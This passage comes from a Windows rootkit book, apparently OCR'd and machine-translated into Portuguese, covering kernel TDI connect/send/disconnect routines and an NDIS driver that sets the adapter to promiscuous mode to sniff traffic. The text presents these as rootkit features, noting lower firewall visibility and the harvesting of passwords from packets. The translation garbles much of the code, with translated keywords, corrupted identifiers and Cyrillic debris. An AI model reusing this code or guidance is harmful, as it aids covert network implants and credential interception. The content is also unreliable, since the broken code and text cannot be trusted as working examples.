// Endereço de IP
TDI_COMPLOTION_CONTEXT COMPECONTEXT;
PTransport_address pta = (pTransport_address) & cbuffer;
KelnitializeEvenente (ScompContext.kcompletevent, notificação,
FALSO)
;
ptdidevice = iogeTreLatedDeviceObject (OCONNECTION);
/* A descrição da próxima função será encontrada em:
http://msdn.microsoft.com/library/en-us/network/hh/network/
34BLDMAC_F4
308
60A-9AE2-4
37
9-BFFC-6B0A810
92E7C.XML.
ASP?
4
PLRP
TdibuldinterNalDevicontrolirp (TDI Connect,
ptdidevice,
230

pagina: 230

Capítulo 
10. 
Rutkin 
Suscare 
Com 
mestre 
Conexão, scompContext.kcompletevent, slostatus); 
IF (PIRP) 
{ 
// Defina os valores do tempo limite 
Timeout.quadPart = 1000.000L; 
Timeout.quadPart *= segundos; 
Timeout.quadPart = -(timeout.quadPart) 
; 
/* Inicialize o requestConnectionElnfo: defina o endereço 
Computador remoto */ 
Rci.remoteAddress = (pvoid) pta; 
Rci.remoteaddressLength = sizeof (pTransport_address)+ 
sizeof (tdi_address_ip); 
// Número de endereços de transporte - 1 
Pta-> taaddressCount = 1; 
/* 
Nós preenchemos o endereço de transporte 
Endereço 
= Tipo de endereço 
Endereço do comprimento = comprimento 
Endereço 
= Estrutura selecionada dependendo de 
Tipo de endereço. 
*/ 
Pta-> endereço [0] .AddressStype = tdi_address_type_ip; 
Pta-> endereço [0] .AddressLength = sizeof (tdi_address_ip); 
ptdilp = (tdi__Address_ip *) & PTA-> ADMS [0] .Address; 
/* Estrutura tdi_address_ip é semelhante à estrutura de Sockaddr_in 
No modo de usuário: 
sin_port 
sin_zero 
in_addr 
Deixe -me lembrá -lo de que antes de chamar essa função, você precisa trazer 
Valores do endereço IP e da porta de acordo com a rede 
bytes com a ajuda de inet_addr () e htons (): 
Tdi_connect (connegtion, inet_addr ("127.0.0.1"), htons 
(3474)); 
ou tdi_connect (connextion, inetaddr ("127.0.0.1"), 
Htons 
(3474)); 
*/ 
ptaip-> sin_port = porta; 
ptaIP-> in_addr = endereço; 
Tdibuildconnect (pirp, ptdidevice, conexão, nulo, nulo, 
STIMEOUT, & RCI, & RTCI); 
S = LocallDriver (Ptddidevice, PIRP); 
if (s == status_pending) 
f 
KewaitforsingleObject (scompcontext.kcompletevent, 
Executivo, Kernelmode, falso, nulo); 
S = iostatusblock.status; 
} 
} 
Retorno s; 
} 
2
3
1

pagina: 231

Rootkits
10.2.5.Trocamos dados
Acabamos de instalar a conexão.Mas isso, você entende, não é suficiente.
Ainda precisamos trocar dados com um computador remoto.Esse
Provavelmente haverá a tarefa mais difícil.
Para enviar dados, você pode simplesmente criar ioctl tdi_send e transmitir
seu dispositivo de transporte.Considere a função percebendo isso
(Listagem 10.5).
Listagem 10.5.
Enviando dados
Ntstatus tdi_send (pfile_object Connect, pvoid pdata,
Uint sendLength, uint *pdatasent)
// As funções devem ser transmitidas: o contexto da conexão;
// indicador para os dados transmitidos (a estrutura deles que você define você
eles mesmos);
// tamanho da estrutura transmitida'data;
// ponteiro para a variável em que será registrada
// o número de dados realmente transmitidos
Ntstatus s = statatus_insob comaficiente_resources;
TDI_COMPLOTION_CONTEXT COMPECONTEXT;
PIRP PLRP;
PMDL PSENDMDL;
Pdevice_Object ptdidevice;
I0_status_bl0ck iostatusBlock = {0};
KelnitializeEvent (& CompeContext.kcompletevent,
Notificação, falsa);
ptdidevice = ioGeTreLatedEviceObject (conexão);
*pdatasent = 0;
// precisamos do MDL para enviar dados
PSENDMDL = IOALLOCATEMDL ((PCHAR JPDATA,
SendLenth, falso, falso, nulo);
se
(PSENDMDL)
{
tentar {
MmProBeAndlockPages (PSENDMDL, Kernelmode, Iomodiceccess);
)
Exceto (excepcion_execute_handler) {
Iofreemdl (psendmdl)
;
PSENDMDL = NULL;
};
se
(PSENDMDL)
{
// Formulário ipr
PLRP = tdibuildinalDevicontrolirp (TDI Send,
232

pagina: 232

Capítulo 
10. 
Rutkin 
Suscare 
Com 
mestre 
ptdidevi.ce, 
Conexão, scompContext.kcompletevent, slostatus); 
IF (PIRP) 
{ 
// preenche os parâmetros IRP 
TdibuldSend (PIRP, ptdidevice, conexão, nulo, 
Nulo, psendmdl, 0, sendLength); 
S = icalldriver (Ptdidevice, PIRP); 
if (s == status_pending) 
{ 
KewaitforsingleObject (scompcontext.kcompletevent, 
Executivo, Kernelmode, falso, nulo); 
} 
s = iostatus.status; 
*pdatasent = (uint) iostatus.information; 
// MDL grátis 
se 
(PSENDMDL) 
{ 
MmunlockPages (PSENDMDL); 
Iofreemdl (psendmdl); 
} 
} 
} 
} 
Retorno s; 
) 
Função tdi_receive, que aceita dados de um dispositivo de transporte
TVA através do ioctl tdi_receive, você se escreve.Vou apenas contar 
Como fazer isso.Aqui está o protótipo dela: 
Void tdi_receive ( 
No PIRP PIRP, 
Em pdevice_object pdevoBJ 
, Assim, 
Em pfilejdbject pfileobj, 
Em PVOid Comproutine, 
Em pvoid contxt, 
No PMDL Mdladdr, 
Em enxbios de Ulong, 
Em Ulong Recexelen 
); 
O valor do parâmetro p i r p é claro - este é o ponteiro para IRP tdi_receive. 
O próximo parâmetro pdevobj é um ponteiro para o objeto de dispositivo 
(Ptddidevice dos folhetos 10.3 - 10.5). 
233

pagina: 233

Rootkits
O terceiro parâmetro é um ponteiro para o contexto da conexão.Desde Con
O texto da conexão refere -se a descritores de arquivos e, em seguida, na documentação
Msdn é chamado de objeto de arquivo e o contexto da conexão (ou seja,
Descritor) - o ponto final da conexão (endpoint de conexão).Tudo isso sou eu
Eu digo a você para que você não fique confuso lendo a documentação do MSDN.
O quarto parâmetro comprometido é o procedimento final para
O despachante de entrada/saída causou quando o despachante completa o recurso
Inicialização do IRP.Este parâmetro pode ser instalado no NULL.
O quinto parâmetro contxt é um contexto definido pelo usuário,
Vermelho pelo procedimento final indicado no parâmetro anterior.
Se o parâmetro de compromisso for nulo, esse parâmetro também será igual
Nulo
O próximo parâmetro é o endereço MDL.MDL deve ter um buffer em
Que será registrado nas informações.Inflags parâmetro pos
inibe para definir as opções para receber dados: na maioria dos casos, é adequado
Tdl_recelve_normal.Se você precisar de parâmetros especiais, leia sobre
Você pode na documentação do MSDN.
O último parâmetro é o comprimento do buffer, que será gravado em
Informação de raio.
10.2.6.Concluímos a conexão e liberamos os recursos
Para concluir a conexão atual, a chamada da função de desconexão é
(Listagem 10.6), que precisa ser transmitido apenas pelo descritor da conjunção.
Listagem 10.6.
Conclusão da conexão
Ntstatus tdi_disconnect (conexão pfile_object)
{
Ntstatus s = statatus_insob comaficiente_resources;
PIRP PLRP;
Pdevice_Object ptdidevice;
Io_status_block iostatus = {0}
;
Tdi_connection_information
Rci = {0}
;
Uint número de segundos = 60*3;
Timeout large_integer = {0};
TDI_COMPLOTION_CONTEXT COMPECONTEXT;
KelnitializeEvent (scompcontext.kcompletevent,
Notificação, falsa)
;
ptdidevice = ioGeTreLatedEviceObject (conexão);
PLRP = tdibuildinalDevicontrolirp (tdi_disconnect,
234

pagina: 234

Capítulo
10.
Rutkin
Suscare
Com
mestre
ptdidevice,
Conexão, stdicomplationcontext.kcompletevent,
& Iostatus);
se
(PLRP)
(
Timeout.quadPart = 1000.000L;
Timeout.quadPart *
= Número de segundos;
Timeout.quadPart =
-(timeout.quadPart);
TdibuildDisconnect (PLRP, ptdidevice, conexão, nulo, nulo,
STIMEOUT, tdi_disconnect_abort, null, & rci);
S = icalldriver (ptdidevice, PLRP);
if (s == status_pending)
(
Kewaitforsingleobj
Ect (scompcontext.kcompletevent,
Executivo, Kernelmode, falso, nulo);
S = iostatusblock.status;
}
}
Retorno s;
Após a conclusão da conexão, você não precisa apenas fechar os descritores, mas
Primeiro, deixe -os (destrua a conexão entre o objeto de transporte
endereço e contexto de conexão).Função desvinculada (Listagem 10.7)
Executa uma ação, ação reversa da função de link (Listagem 10.3).
Listagem 10.7.Remoto o contexto da conexão do endereço de transporte
Ntstatus unylink (conexão pfile_object)
{
PIRP PLRP;
Io_status_block iostatus = {0};
Pdevicejdbject ptdidevice;
TDI_COMPLOTION_CONTEXT COMPECONTEXT;
Ntstatus s = statatus_insob comaficiente_resources;
KelnitializeEvent (scompcontext.kcompletevent,
Notificação, falsa)
;
ptdidevice = ioGeTreLatedEviceObject (conexão);
PLRP = TDIBULDLNTERNALDEVICONTROLIRP
(Tdi_disassociate_address,
Ptdidevice, conexão, scompcontext.kcompletevent,
Slostatus);
if (plrp)
(
TdibuildisassassociatEaddress (PLRP, ptdidevice, conexão,
Nulo nulo);
S = icalldriver (ptdidevice, PLRP);
235

pagina: 235

Rootkits 
if (s == status_pending) 
{ 
KewaitforsingleObject (scompcontext.kcompletevent, 
Executivo, Kernelmode, falso, nulo); 
s = iostatus.status; 
} 
} 
Retorno s; 
} 
Somente após uma chamada bem -sucedida para a função Unylink, você pode fechar 
Descritores: o descritor do endereço de transporte e o contexto da conexão. 
NTSTATUS CloseHandle (manipulação HTA, pfile_object connextion) 
f 
ObdereferenceObject (HTA); 
Zwclose (conexão); 
Retornar status_success; 
} 
Nesta visão geral da interface TDI, pode ser considerada concluída.Claro, em 
Ele não finge estar concluído, mas espero que as funções dadas a per
A saída facilitará o trabalho com a interface.E informações adicionais 
Você sempre pode encontrar na internet.Para continuar namorando com tdi eu re
Eu ordeno os seguintes recursos: 
• 
http://msdn.microsoft.com/library/default.asp - biblioteca
ka ms dn; 
• 
http: // www.CodeProject.Com/sistema - um site muito interessante, 
em que você encontrará muitos exemplos de programação TDI e 
Ndis e, em geral, tudo relacionado à programação "profunda" 
Janelas; 
• 
http://www.pcausa.com/tdisamp/default.htm 
- Comercial
Nas bibliotecas e exemplos relacionados ao TDI.Preços, no entanto, Kusa
Eles são, mas você terá muito código útil.No site você pode baixar 
Já compilou exemplos e documento acompanhante
ção para descobrir por que eles pedem esse tipo de dinheiro. 
Em conclusão, lembro que uma das deficiências do TDI é que 
É muito perceptível para firewalls.Por outro lado, é suficiente 
Simples, porque não precisamos desenvolver nossa própria pilha 
Protocolo TCP/IP.No próximo capítulo, falaremos sobre o NDIS.Imediatamente 
Eu noto que será mais difícil.Onde é ainda mais difícil?Você verá. 
236

pagina: 236

Capítulo 11. Interface 
Ndis. 
Criando uma rede 
Farejador 
• 
Registro do protocolo no sistema 
• 
Formação do fluxo de funções 
Protocolo 
• 
Análise de pacotes 
Rootkits

pagina: 237

Neste capítulo, nos familiarizaremos com a interface NDIS.Sim, é uso 
Ainda mais complicado que o TDI, mas isso se justifica.Se TDI é duro
caminhando ao trabalhar no nível do núcleo (afinal, métodos comuns que usamos
Não podemos), então, quando estivermos usando o NDIS, abrimos ações
Telly Possibilidades impressionantes.Por exemplo, o NDIS permite que você trabalhe 
Diretamente com a rede - com os "pacotes brutos" tão chamados 
(Pacotes brutos) - por ninguém antes dos pacotes processados.Nós também somos mo.
Peel para "ouvir" todos os pacotes que o nó transmite e aceita. 
para o qual nosso rutkit é lançado, isto é, de fato, podemos criar um local 
Sniffer de rede.Por que local?Sim porque ele vai ouvir
nem todos os pacotes transmitidos pela rede, mas apenas aqueles que são
Dá e aceita um computador local.Você pode criar um conjunto real
uivo de um sniffer que interceptará os pacotes mesmo em interruptores 
redes.Neste capítulo, você e eu tentaremos criar exatamente um sniffer. 
Ele converterá um adaptador de rede em um modo de escuta e interceptação
Para esfregar todos os pacotes transmitidos por meio de nosso segmento de rede. 
Mas você precisa pagar por tudo.Nesse caso, pagamos nosso 
Conveniência e tempo - porque teremos que criar nosso próprio protocolo 
TCP/IP.Embora como um bônus tenhamos um grau adicional não
Visibilidade: No nível do NDIS, não somos tão perceptíveis para o firewall. 
Se você quiser criar rapidamente um simples sofrimento de sacolas, eu posso
Recomendar dois links: 
• 
http://wwww.codeproject.com/csharp/sendrawpacket.asp 
- 
Interceptação de pacotes de toda a rede e um exemplo da transferência de uma placa de rede para o Pro
modo de escuta (modo promiscoso); 
238

pagina: 238

Capítulo 11. Interface NDIS.Criação de uma rede Tonshffer 
• 
http://www.codeproject.com/csharp/pktcap.asp 
- Usar
Chamando a biblioteca WinPCap para criar uma rede simples 
Farejador. 
Mas não se apresse em baixar imediatamente a fonte!Primeiro leia isso 
capítulo e depois lidar com os códigos de origem desses aplicativos, em
O que você não entenderá nada.Você precisa ler pelo menos este capítulo - você pode 
Não compilar um exemplo dado neste capítulo (para economizar tempo), 
E imediatamente assuma a consideração das fontes acima.Mas também 
Depois de repetir: se você não ler, não entenderá nada. 
11.1.Registro do protocolo no sistema 
Como desenvolveremos nosso próprio vidro do protocolo, devemos 
Registre um novo protocolo no sistema.Vamos chamá -lo de Ndisproto. 
Para registrar o protocolo, precisamos decidir com qual interface
SOM (cartão Ethernet, adaptador de radioethernet, etc.), trabalharemos. 
Você pode encontrar uma lista de interfaces em potencial na próxima chave
CARE CHECH: 
• 
HKLM \ System \ CurrentControlset \ Services \ TCPIP \ Linkage 
• 
HKLM \ Software \ Microsoft \ Windowsnt \ CurrentVersion \ 
NetworkCards 
O verdadeiro rootkit deve "calcular" o ID da interface com o qual é
As crianças para trabalhar, mas para simplificar a tarefa, instalaremos o ID da interface é claramente. 
No meu caso, será {4DL5E975-E375-ALLCE-BFCL-08102BEL0348}.Na tua 
- É hora de começar o Regedit e ver. 
Depois de decidirmos o nome do protocolo e ID do interior que trabalha
Feys, precisamos determinar a estrutura das características do protocolo.Soluços
Assim, este é o vidro do protocolo.Nesta estrutura, você define funções para
que será chamado no início de um evento específico.Na verdade, 
Você precisa estabelecer a reação de nosso motorista a certos eventos 
Interface, por exemplo, para receber ou enviar um pacote.Por exemplo, kog
Sim, você receberá um pacote, sua cópia será completamente entregue ao subprograma, 
Especificado por um membro da estrutura de recepção
pacote).É aqui que interceptamos o pacote.Você pegou a ideia?Se não, 
Leia este parágrafo novamente e, se assim for, seguimos em frente. 
Quando a estrutura das características estiver pronta, podemos causar uma função 
NdisregisterProtocol para registrar nosso protocolo NDISProto. 
239

pagina: 239

Rootkits 
Para cancelar o registro do protocolo, a função de ndisderegis é usada
t e r p r o c o l. 
Se o protocolo estiver registrado com sucesso, precisamos chamar uma função 
NdisopeNadapter.Esta função está conectada à nossa interface 
(que definimos usando ID).Aqui você precisa pegar um ponto importante: 
A função pode retornar o status ndis_status_pending, o que significa que 
NDIs não podem abrir o adaptador imediatamente, mas certamente farão isso, 
Apenas um pouco mais tarde.Assim que isso acontece, NDIs independentemente
A função especificada por um membro da estrutura das características do OpenAdapter
Completehandler.No nosso caso, será a função de ndisopeNadapt
ErComplete (consulte Listagem 11.1).Se o NDIS abriu o adaptador imediatamente, nós 
Eles devem chamar a função ndisopeNadapterComplete por conta própria. 
Deve -se notar que esse comportamento da biblioteca NDIS também é característico de 
Outras funções: se ocorrer um atraso, o NDIS causa uma função 
automaticamente após a ocorrência de um evento, e de outra forma devemos 
Chame de si mesmo. 
Agora vamos incorporar tudo o que é acima na função d r i v e r e n t r y 
Drivers (Listagem 11.1). 
Listagem 11.1.O ponto de entrada do motorista 
#include "ntddk.h" 
// Esta definição deve ser definida antes da conexão ndis.h 
#Define ndis50 1 
Finclude 
"ndis.h" 
estrutura _my_struct { 
Ulong mydata; 
Status ndis_status; 
} my_struct; 
// define descritores globais 
Ndis_handle adapterHandle; 
Ndis_handle protondle; 
Ndis_event waitevent; 
NTSTATUS DriverEntry (no driver pdriver_object, em punicode_string 
Regpath); 
{ 
Ndis_status nstat, errstat; 
// quarta -feira - apenas 802.3 (Ethernet) 
Ndis_medium meio = ndismedium802_3; 
UINT MédioLnd = 0; 
Unicode_string adapName; 
Características do protocolo NDIS PC; 
// o nome do adaptador 
// Características do protocolo 
NDIS String Protoname = NDIS String const 
("Ndisproto '' 
240

pagina: 240

11. NDIS.С с аание сететelh о сitante 
/ / им прото deve 
Rtllnitunicodestring (sadapName, 
L "\\ dispositivo \\ {4dl5e975-e375-llce-bfcl-08102bel0348}"); 
NdisinitializeEvent (Swaitevent) ' 
Driver-> driverUnload = descarregar; 
// ицициаferir 
Rtlzeromemory (SPC, 
sizeof (ndis_protocol_characteristics)); 
Pc.MajorNDisVersion = 5; 
Pc.MinorNorDisVersion = 0; 
PC.Reservado 
= 0; 
Pc.name 
= protoname; 
Pc.opeNadapterCompleteHandler = ndisopeNadapterComplete; 
Pc.cloSeAdapterCompleteHandler = ndiscloSeAdApterComplete; 
Pc.sendCompleteHandler 
= NdissendComplete; 
Pc.TransferdatacElteteHandler = ndistransferdatacpletelete; 
PC 
.ResetCompleteHandler 
= NdisResetComplete; 
Pc.RequestCompleteHandler 
= NdisRequestComplete; 
PC 
.ReceiveHandler 
= NdisReceive; 
PC 
.Receivecicletehandler 
= NdisReceiveComplete; 
Pc.statushandler 
= NdisStatus; 
Pc.statusCompleteHandler 
= NdisStatusComplete; 
Pc.bindadapterhandler 
= NdisbindAdapter; 
Pc.unbindadapterhandler 
= NdisunbindAdapter; 
Pc.unloadhandler 
= NdisproTounLoad; 
Pc.receivepackethandler 
= NdisReceivePacket; 
Pc.pnpeventHandler 
= Ndispnpevent; 
// рииglitivamente прото deve.A н Devora 
não: 
// в з з в в в в в в в в в в в в в в в в в в в в в в в в в в в в land 
// деек sentido прото sentido и ххара sentido 
// рззер срр deve 
Ndisregisterprotocol (snstat, SprotoHandle, 
& PC, 
sizeof (hdis_protocol_characteristics)); 
if (nstat! = ndis_status_success) 
EU 
Dbgprint ("Erro: NdisRegisterProtocol falhou!"); 
retornar nstat; 
} 
/* o 
nstatm errstat - коы з вррата 
Adaptadorhandle - в зрращаutos деериптор ааптера 
Маас< Medium ззaд сиitivamente 
A. 
(802_3), 
б проводный (радио) аааótimo (802_11) и. 
д. 
Еременна al Mediumlnd з Toda заа иеееееее маа изз ееее иее ие ие иееее ие изе зааааа изе иее зеа иааа изе ззе зеа зеа ззd зеа зеd зеd зеd ззd ззd ззdd зеаа зе пззз изз иззз изз зз ззd мааааа ззз изз изз из изз ие из изз изз из пе пе зз зз зз зе иа пзз зз з medium за и пз п medium medium з м п з € 
O 
ааптера, 
ко Está 
1 - ээ ощщщщ клочеitivamente ээээенntos 
ProtoHandle - десриптор прото deve, поччa п прый прч прчч прчччч прчч прчч прч п прчч прчч п п п прччч ês 
Ndisregisterprotocol 
241

pagina: 241

Rootkits 
my_struct - definido pelo usuário, isto é, você, você, 
estrutura 
AdapName - o nome do adaptador que precisa ser aberto 
*/ 
NdisopeNadapter (Snstat, Serrstat, & AdapterHandle, Smediumlnd, 
Smedium, 1, 
Protondle, & my_struct, sadapName, 0, null); 
if (nstat =! ndis_status_pending) 
{ 
// Sem atraso, precisamos ligar para o ndisopeNadapterComplete 
por conta própria 
// mas primeiro, verifique se há um erro 
if (ntstatus (nstat) == false) 
{ 
// sim, ocorreu um erro 
char _s [255]; 
_Sprintf (_s, 253, "Erro: 0x%08x", nstat); 
Dbgprint (_s); 
NdisDeregisterProtocol (SnStat, ProtoHandle); 
if (ntstatus (nstat) == false) 
Dbgprint ("Erro: ndisDeregisterProtocol falhou."); 
Retornar statusjjjnsucessful; 
} 
Outro 
NdisopeNadapterComplete (& my_struct, nstat, ndis_status_success) 
; 
) 
Retornar status_success; 
} 
11.2.Formação do fluxo das funções do protocolo 
Digamos que um décimo do trabalho está feito.Agora temos que desenvolver
prenda todas as funções que indicamos na estrutura das características de
Tokola.Eu posso agradar você: algumas funções não fazem nada, isso 
Apenas plugues, para que seu código seja mínimo.Mas isso é apenas em nosso 
caso trivial.Quando você desenvolve um NDIS sério
Driver, você terá que preencher todas essas funções com um código real. 
Começaremos com a função NdisoPenadapterComplete.Sua principal tarefa é
Coloque o adaptador de rede em um modo de escuta (modo promiscoso) com 
O objetivo de interceptar todos os pacotes transmitidos pela rede.Mas antes disso 
É necessário verificar se ocorreu um erro ao abrir a interface. 
Listagem 11.2.Manipulador de abertura do adaptador 
Void ndisopeNadapterComplete ( 
Em ndis_handle protocolbindingconte, 
242

pagina: 242

Capítulo 11. Interface NDIS.Criação de uma rede Tonshffer 
No status ndis_status, 
Em ndis_status OpenErrorCode 
) 
{ 
II Modo de escuta 
Ulong ndismode = nids_packet_type_promiscousus; 
Ndis_request ndisRequest; 
Ndis_status nstat; 
se 
(Nt_success (OpenErrorCode)) 
{ 
NdisRequest.ReQuestType = ndisRequestEsetlnformation; 
NdisRequest.data.set_information.oid = 
Oid_gen_current_packet_filter; 
NdisRequest.data.set_information.informationbuffer = sndismode; 
NdisRequest.data.set_information.informationBufferLength 
Tamanho de (Ulong); 
// Instale o modo de escuta. 
// parâmetros: indicador para status 
// Conclusão, o descritor do adaptador e o próprio NDIS-Request 
NdisRequest (SnStat, adaptadorHandle, sndisRequest); 
} 
Outro 
{ 
char _s [255]; 
_Sprintf (_s, 253, "NdisopeNadapterComplete Erro 0x%08x", 
OpenErrorCode); 
Dbgprint (_s); 
} 
} 
Ele está deixando a caixa registradora, escreva a função NDISCLOSEADAPTERCOMPLETE.Dela 
A tarefa é informar ao motorista que a operação de fechamento do adaptador está concluída. 
A função é muito simples - simplesmente define o evento de espera, que
O tormento ocorrerá assim que o fechamento do adaptador terminar: 
Void ndisprotcloeAdapterComplete ( 
Em ndis_handle 
ProtocolbindingContext, 
Em ndis_status 
Status 
) 
{ 
Dbgprint ("ndisprotcloSeAdapterComplete chamado"); 
Dbgprint ("NdisprotcloSeAdapterComplete 
Contexto 
Fechar 
Espere 
Evento ... "); 
Ndissetevent (swaitevent); 
} 
Agora vamos lidar com a função ndisReive (listagem 11.3) causada como 
Apenas um novo pacote chega ao adaptador.É com a ajuda desta função 
Podemos interceptar pacotes. 
243

pagina: 243

Rootkits 
Os parâmetros mais interessantes da função são PheaderBuffer 
e PlookaHeadbuf f er.O primeiro parâmetro contém um ponteiro para o título 
Bolo Ethernet, e o segundo é o ponteiro da parte restante do pacote.No entanto 
Plookaheadbuf fer nem sempre contém o pacote inteiro, mas estamos falando sobre isso
Roma no próximo parágrafo. 
Tendo recebido um pacote, não faremos nada com ele - vamos sair 
Seu tipo e tamanho, e o sistema informará que não nos interessa - status 
Status ndis não 
Aceitaram. 
Listagem 1 1.3.Processador de pacotes 
Ndis_status ndisReceive 
( 
Em ndis_handle protocolbindingconte, 
// 
Nossa estrutura 
Em ndis_handle macreceiveContext, 
Em pvoid 
Pheaderbuffer, 
// título do pacote Ethernet 
Em uint 
Cabeçalho 
Em pvoid 
PlookaheadBuffer, 
// 
ponteiro em 
Todo o pacote 
Em uint 
Lookaheadbuffersise, 
Em uint 
Packetsize 
) 
{ 
Uint FrameType = 0; 
// 
tipo 
Quadro 
Memcpy (& FrameType, ((((char *) HeaderBuffer + 12), 2); 
char _s [255]; 
_Sprintf (_s, 252, "Receba quadro: tipo %u, size = 
%você 
bytes ", 
FrameType, PacketSize) 
; 
Dbgprint (_s); 
Devolver o status do NDIS não 
Aceitaram; 
Fizemos quase tudo o que precisávamos.Nós apenas temos que escrever 
Função de descarregamento (descarregamento do driver) e funções do perdedor. 
Antes de descarregar o motorista da memória, é necessário fechar o adaptador no pro
Você corre o risco de ver a tela azul da morte.Isso serve 
Função de descarga (Listagem 11.4). 
Listagem 1 1.4.Fechando o adaptador 
Descarregar void (em 
Driver pdriver_object) 
{ 
Ndis_status nstat; 
Dbgprint ("Driver de descarga ..."); 
244

pagina: 244

Capítulo 11. Interface NDIS.Criação de uma rede Tonshffer 
NdisResetevent (Swaitevent) 
; 
NdiscScloSeAdapter (SNSTAT, Adapthandle); 
if (nstat == status_pending) { 
Dbgprint ("descarregamento pendente"); 
Ndiswaitevent (Swaitevent, 0) 
; 
} 
NdisDeregisterProtocol (SnStat, ProtoHandle); 
if_success (nstat) == false) 
{ 
Dbgprint ("não pode descarregar o driver"); 
} 
EU 
Nas funções dos subsídios em que estamos interessados, de fato, apenas seus 
Protótipos (Listagem 11.5). 
Listagem 11.5.Manipuladores de outros eventos 
Void NdissendComplete ( 
Em ndis_handle protocolbindingconte, 
Em pacote ndis_packet, 
No status ndis_status) 
{ 
Dbgprint 
} 
Ndistransferdatacplemplete de vazio ( 
Em ndis_handle protocolbindingconte, 
Em pndis_packet pacote, 
No status ndis_status, 
Em uint bytestransfeed) 
{ 
Dbgprint 
} 
Void NdisReveComplete (no protocolbindingContext Ndis_Handle) 
{ 
Dbgprint 
} 
Void NdisStatus 
( 
Em ndis_handle protocolbindingconte, 
No status ndis_status, 
No statusbuffer pvoid, 
Em uint stausbuffersize) 
{ 
Dbgprint ("NdisStatus 
Chamado "); 
} 
Void NdisStatusComplete (no protocolbindingContext Ndis_Handle) 
{ 
Dbgprint ("NdisStatusComplete chamado");

pagina: 245

Rootkits
)
Void ndisResetComplete (
Em ndis_handle protocolbindingContext,
No status ndis_status)
{
Dbgprint ("NdisResetComplete chamado");
}
Void NdisRequestComplete (
Em ndis_handle protocolbindingContext,
Em Pndis_Request Ndisreq,
No status ndis_status)
{
Dbgprint ("NdisRequestComplete chamado");
}
Void ndisbindadapter (
Em ndis_handle protocolbindingContext,
No nome de deviceN nome de Pndis_string,
Em pvoid ssi,
Em pvoid ss2)
{
Dbgprint ("ndisbindadapter chamado");
}
Void ndisunbindadapter (
Out pndis_status status,
Em ndis_handle bindContext,
Em Pndis_Handle UnbindContext
)
{
Dbgprint ("ndisunbindadapter chamado");
)
Void ndisproTounLoad (vazio)
{
Dbgprint ("NdisProTounload chamado");
}
Ndis_status ndispnpevent (
Em ndis_handle protocolbindingContext,
Em pnet_pnp_event pnpevent)
(
Dbgprint ("ndispnpevent chamado");
return ndis_status_success;
}
Int ndisReceivePacket (
Em ndis_handle protocolbindingContext,
No pacote pndis_packet)
{
Dbgprint ("NdisReceivePacket chamado");
retornar 0;
}
246

pagina: 246

Capítulo 11. Interface NDIS.Criação de uma rede Tonshffer 
11.3.Análise de pacotes 
Como já observado, a função ndisReive nem sempre recebe um completo 
Pacote (parâmetro PlookaHeadBuf Fer), mas apenas parte dele.Em nossas prostas
O caso não é um problema.O título do pacote está disponível, e isso é para nós 
A coisa principal.Mas se você escrever um Sniffer real, então a principal coisa para você não é
Dexteroso e o corpo do pacote - está analisando o corpo do pacote, você pode obter 
Senhas e outras informações importantes para você. 
Precisamos garantir que tenhamos o pacote inteiro.Para isso, precisaremos 
Dois buffers e chamando a função ndistransportData.Vamos anunciar os buffers como 
Variáveis ​​globais: 
Ndis_handle packetpool; 
/ / pacote de pacotes 
Ndis_handle bufferpool; 
/ / pool de buffer 
Também precisamos modificar a função NdisoPeNadapterComplete. 
Depois de ligar: 
NdisRequest (SnStat, 
Adaptadorhandle, 
SndisRequest); 
Você precisa adicionar as seguintes chamadas inicializando variáveis 
Packetpool bufferpool: 
N d i s a l l o c a t e p a c e t p o l (s n s t a t, 
Spacketpool, 
Transmit_packets, 
s i z e f (packet_reserved)); 
N d i s a l l o c a t e b u f f f f e r p o l (s n s t a t, 
Sbufferpool, 
Transmit_packets); 
Depois de inicializar o pacote e a bala de piscina de buffer, podemos executar 
Operações de movimento de dados nas funções da sua pilha, em particular, nós 
Podemos chamar a função Ndistransf erdata. 
Também usaremos a estrutura do ndis_packet.Um de seus membros 
Respondido por armazenar o cabeçalho do pacote e o outro contém o decreto
Tel em uma cadeia de buffers em que o conteúdo é armazenado.Vamos destacar PA
Brilhante para um buffer grande que possa acomodar todos os buffers.Depois 
Isso, usando o ndistransf erdata, escrevemos o conteúdo de todo o pacote 
Neste buffer. 
Se a chamada ndistransferdata termina imediatamente, então devemos
Chame a função ndistransferdatacpletelete.Se o desafio 
Ndistransferdata terminou com o status de atraso, depois os NDIs independentemente
ligará para o ndistransferdatacplel assim que a transmissão de dados 
Será concluído. 
Agora, reescrevemos a função ndisReiving.É mais fácil reescrever
Em, como explicar o que e depois de que linha você precisa adicionar. 
247

pagina: 247

Rootkits
Listagem 11.6.
Obtendo um pacote inteiro
Ndis_status ndisReceive (
Em ndis_handle protocolbindingconte,
// nossa estrutura
Em ndis_handle macreceiveContext,
Em pvoid
Pheaderbuffer,
// título do pacote Ethernet
Em uint
Cabeçalho
Em pvoid
PlookaheadBuffer,
// ponteiro para todo o pacote
Em uint
Lookaheadbuffersise,
Em uint
Packetsize
{
Ndis_status s;
Uint FrameType = 0;
Pacote pndis_packet;
Buffer pndis_buffer;
Ndis_handle buffpool;
Ulong Buflength;
Uint bytestransfeed;
ULONG transfeersize = 0
Temperatura pvoid;
Tamanho Uint
Uint ehl
// status ndis
// tipo de quadro
// saco de plástico
// amortecedor
// Pool de buffer
// comprimento do boofer
// Baytov transmitido
// tamanho dos dados transmitidos
// variável temporária
1514 - Ethernet_header_length;
Comprimento do cabeçalho Ethernet;// Comprimento da cabeça Ethernet
Transfeersize = packetsize;
if ((ehl <headerbuffersize)
I (transfera mize> tamanho))
Retornar o status do NDIS não aceito;
}
Memcpy (& FrameType, ((((char *) HeaderBuffer + 12), 2);
char _s [255];
_Sprintf (_s, 252, "Receba quadro: digite %u, size = %u bytes",
FrameType, PacketSize);
Dbgprint (_s);
// ignore tudo, exceto ip (tipo = 0x0008)
if (FrameType! = 0x0008)
f
Dbgprint ("FrameType <> 0x0008");
Return ndis_status_not_accepted;
)
Temp = exallocatepool (sem -Pagedpool, tamanho);
se (temp)
Rtlzeromemery (temp, tamanho);
NdisAllocatePacket (& S, Spacket, Packetpool)
if (s = ndis status sumcess)
248

pagina: 248

Capítulo 11. Interface NDIS.Criação de uma rede Tonshffer 
{ 
// salve o cabeçalho Ethernet 
Reservado (pacote)-> pheaderBufferp = 
Exallocatepool (NONPAGEDPOOL, EHL); 
If (reservado (pacote)-> pheaderbufferp) 
{ 
Rtlzeromememory (reservado (pacote)-> pheaderbufferp, ehl); 
Memcpy (reservado (pacote)-> pheaderbufferp, 
Char *) pheaderbuffer, 
Ehl); 
Reservado (pacote)-> pheaderbufferlen = ehl; 
